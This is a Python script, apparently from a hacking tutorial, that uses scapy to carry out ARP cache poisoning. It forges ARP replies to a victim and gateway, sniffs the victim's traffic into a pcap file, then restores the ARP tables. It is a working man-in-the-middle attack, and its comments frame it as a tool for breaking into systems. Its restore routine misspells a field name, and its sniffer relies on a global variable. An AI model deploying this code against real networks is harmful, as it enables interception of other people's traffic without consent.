from multiprocessing import Process
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

import os
import sys
import time

# ---------------------------------------------------------------------
# We're gonna poison the ARP cache of a system to route traffic through
# our machine. Effectively this is a man-in-the-middle attack, and is
# super useful to know how to do if you're going to break into shit.
# ---------------------------------------------------------------------


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None
    # -----------------------------------------------------------------------
    # get_mac takes an IP address and creates a packet. Ether function
    # specifies a broadcast, and ARP specifies a request for the MAC address.
    # Scapy function 'srp' sends and receives packets on layer 2. The 'resp'
    # variable receives the answer to the packet containing the 'Ether' layer
    # source (the MAC address) of the target IP address.
    # -----------------------------------------------------------------------


class Arper:
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}: ')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)
        # --------------------------------------------------------------------
        # Arper class is initialized with the victim and gateway IPs as well
        # as the interface we want to use, in this case eth0 because that's
        # what my ifconfig showed as the interface. Adjust this to your
        # own interface, don't just copy this code word for word. Info about
        # the gateway IP and MAC are printed, same for the victim.
        # --------------------------------------------------------------------

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # --------------------------------------------
        # poison_thread process poisons the ARP cache
        # --------------------------------------------
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
        # --------------------------------------------
        # sniff_thread process lets us watch the
        # attack with a network sniffer
        # --------------------------------------------

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. [CTRL -C] to stop.')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=250):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = 'ip host %s' % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,
                pdst=self.victim,
                hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsr=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'), count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
